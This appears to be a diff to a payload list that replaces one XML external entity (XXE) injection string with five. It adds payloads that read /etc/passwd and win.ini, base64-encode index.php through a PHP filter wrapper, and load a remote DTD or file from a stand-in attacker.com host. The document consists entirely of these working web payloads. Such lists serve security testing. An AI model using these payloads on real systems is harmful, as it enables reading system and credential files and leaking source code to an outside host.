@@ -1,1 +1,5 @@
-<!ENTITY xxe SYSTEM 'file:///etc/passwd'>
+<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]> <r>&xxe;</r>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <r>&xxe;</r>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://attacker.com/evil.xml">]> <r>&xxe;</r>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]> <r>&xxe;</r>
